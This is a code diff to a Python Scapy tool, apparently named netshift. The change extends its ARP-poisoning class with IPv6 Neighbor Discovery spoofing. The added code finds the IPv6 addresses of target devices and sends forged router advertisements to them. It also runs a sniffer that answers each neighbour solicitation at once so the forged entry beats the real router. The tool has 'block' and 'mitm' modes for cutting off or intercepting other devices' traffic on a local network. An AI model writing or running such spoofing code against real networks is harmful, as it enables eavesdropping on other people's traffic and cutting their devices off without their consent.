@@ -26,11 +26,20 @@ import time
 from dataclasses import asdict, dataclass
 from pathlib import Path
 
-from scapy.all import ARP, Ether, getmacbyip, sendp
+from scapy.all import (
+    ARP,
+    ICMPv6ND_NS,
+    AsyncSniffer,
+    Ether,
+    IPv6,
+    getmacbyip,
+    sendp,
+)
 
+from . import ndp
 from .netif import NetInfo
 
-BLACKHOLE_MAC = "02:00:00:00:00:01"
+BLACKHOLE_MAC = ndp.BLACKHOLE_MAC
 STATE_PATH = Path(tempfile.gettempdir()) / "netshift-state.json"
 RESTORE_ROUNDS = 5
 RESTORE_GAP = 0.35
@@ -41,6 +50,7 @@ class Target:
     ip: str
     mac: str
     deadline: float | None = None  # unix time, or None for "until stopped"
+    ip6: str = ""                  # discovered link-local/global address
 
 
 def _sysctl_key() -> str:
@@ -77,17 +87,21 @@ def _send(frames: list, iface: str) -> None:
 class Poisoner:
     """Keep a set of devices poisoned until :meth:`stop` is called."""
 
-    def __init__(self, net: NetInfo, mode: str = "block", interval: float = 1.5) -> None:
+    def __init__(self, net: NetInfo, mode: str = "block", interval: float = 1.5,
+                 ipv6: bool = True) -> None:
         if mode not in ("block", "mitm"):
             raise ValueError("mode must be 'block' or 'mitm'")
         self.net = net
         self.mode = mode
         self.interval = interval
+        self.ipv6 = ipv6
         self.targets: dict[str, Target] = {}
         self.gw_mac: str | None = None
+        self.router_ip6: str = ""
         self._prev_forward: int | None = None
         self._stop = threading.Event()
         self._thread: threading.Thread | None = None
+        self._sniffer: AsyncSniffer | None = None
         self._started = False
         self._lock = threading.RLock()
 
@@ -123,6 +137,9 @@ class Poisoner:
     # -- lifecycle ---------------------------------------------------------
     def start(self) -> None:
         if self.active:
+            if self.ipv6:
+                self._prepare_ipv6()
+                self._save_state()
             return
         self.gw_mac = getmacbyip(self.net.gateway)
         if not self.gw_mac:
@@ -132,11 +149,16 @@ class Poisoner:
             self._prev_forward = get_forwarding()
             set_forwarding(1)
 
+        if self.ipv6:
+            self._prepare_ipv6()
+
         self._save_state()
         self._stop.clear()
         self._started = True
         self._thread = threading.Thread(target=self._loop, name="netshift-poison", daemon=True)
         self._thread.start()
+        if self.ipv6 and self.router_ip6:
+            self._start_ndp_sniffer()
         atexit.register(self.stop)
 
     def stop(self) -> None:
@@ -145,18 +167,88 @@ class Poisoner:
             return
         self._started = False
         self._stop.set()
+        if self._sniffer is not None:
+            try:
+                self._sniffer.stop()
+            except Exception:
+                pass
+            self._sniffer = None
         if self._thread is not None:
             self._thread.join(timeout=3)
             self._thread = None
         self.restore()
 
     # -- internals ---------------------------------------------------------
+    def _prepare_ipv6(self) -> bool:
+        """Learn the router's link-local address and one address per target."""
+        if not self.ipv6:
+            return False
+        self.router_ip6 = ndp.default_router(self.net.iface) or self.router_ip6
+        if not self.router_ip6:
+            return False
+
+        table = ndp.neighbors(self.net.iface)
+        if any(not target.ip6 for target in list(self.targets.values())):
+            if not table or any(target.mac not in table for target in self.targets.values()):
+                table = {**ndp.discover(self.net.iface, self.net.mac), **table}
+        for target in list(self.targets.values()):
+            if not target.ip6:
+                target.ip6 = table.get(target.mac) or ndp.eui64_link_local(target.mac)
+        return True
+
+    def _start_ndp_sniffer(self) -> None:
+        """Answer neighbour solicitations the moment they are sent.
+
+        The periodic advertisement alone loses races against the real router;
+        replying to each NS keeps the forged entry fresh.
+        """
+        for kwargs in ({"filter": "icmp6"}, {}):
+            try:
+                self._sniffer = AsyncSniffer(
+                    iface=self.net.iface, prn=self._on_neighbor_solicitation,
+                    store=0, **kwargs,
+                )
+                self._sniffer.start()
+                return
+            except Exception:
+                self._sniffer = None
+
+    def _on_neighbor_solicitation(self, packet) -> None:
+        try:
+            if ICMPv6ND_NS not in packet or IPv6 not in packet or Ether not in packet:
+                return
+            if not self.router_ip6:
+                return
+            if str(packet[ICMPv6ND_NS].tgt) != self.router_ip6:
+                return
+            source_mac = str(packet[Ether].src).lower()
+            target = next(
+                (t for t in list(self.targets.values()) if t.mac == source_mac), None
+            )
+            if target is None:
+                return
+            source_ip = str(packet[IPv6].src)
+            if not source_ip:
+                return
+            _send([ndp.poison_frame(self.net.mac, target.mac, source_ip, self.router_ip6)],
+                  self.net.iface)
+        except Exception:
+            pass
+
     def _loop(self) -> None:
+        last_v6 = time.time()
         while not self._stop.is_set():
             try:
                 _send(self._poison_frames(), self.net.iface)
             except Exception:
                 pass
+            if self.ipv6 and time.time() - last_v6 > 30:
+                # addresses change (privacy extensions); fill in the gaps
+                try:
+                    self._prepare_ipv6()
+                except Exception:
+                    pass
+                last_v6 = time.time()
             self._stop.wait(self.interval)
 
     def _poison_frames(self) -> list:
@@ -177,6 +269,12 @@ class Poisoner:
                     Ether(dst=self.gw_mac)
                     / ARP(op=2, psrc=target.ip, hwsrc=self.net.mac, pdst=gw, hwdst=self.gw_mac)
                 )
+        if self.ipv6 and self.router_ip6:
+            for target in list(self.targets.values()):
+                if target.ip6:
+                    frames.append(
+                        ndp.poison_frame(self.net.mac, target.mac, target.ip6, self.router_ip6)
+                    )
         return frames
 
     def _restore_frames(self, gateway: str, gateway_mac: str,
@@ -198,6 +296,10 @@ class Poisoner:
                 Ether(dst="ff:ff:ff:ff:ff:ff")
                 / ARP(op=2, psrc=target.ip, hwsrc=target.mac, pdst=target.ip, hwdst="ff:ff:ff:ff:ff:ff")
             )
+            if self.ipv6 and self.router_ip6 and target.ip6:
+                frames.append(
+                    ndp.restore_frame(self.net.mac, target.mac, target.ip6, self.router_ip6, gateway_mac)
+                )
         return frames
 
     def restore(self) -> None:
@@ -252,6 +354,8 @@ class Poisoner:
             "gateway": self.net.gateway,
             "gateway_mac": self.gw_mac,
             "mode": self.mode,
+            "ipv6": self.ipv6,
+            "router_ip6": self.router_ip6,
             "prev_forward": self._prev_forward,
             "targets": [asdict(t) for t in list(self.targets.values())],
         }
@@ -272,6 +376,7 @@ def heal(state_path: Path = STATE_PATH) -> str:
     if not gateway_mac:
         return "Gateway MAC not found; the devices recover on their own shortly."
 
+    gateway_ip6 = data.get("router_ip6") or ""
     frames = []
     for target in targets:
         frames.append(
@@ -286,6 +391,10 @@ def heal(state_path: Path = STATE_PATH) -> str:
             Ether(dst="ff:ff:ff:ff:ff:ff")
             / ARP(op=2, psrc=target.ip, hwsrc=target.mac, pdst=target.ip, hwdst="ff:ff:ff:ff:ff:ff")
         )
+        if gateway_ip6 and target.ip6:
+            frames.append(
+                ndp.restore_frame(gateway_mac, target.mac, target.ip6, gateway_ip6, gateway_mac)
+            )
 
     for _ in range(RESTORE_ROUNDS):
         try:
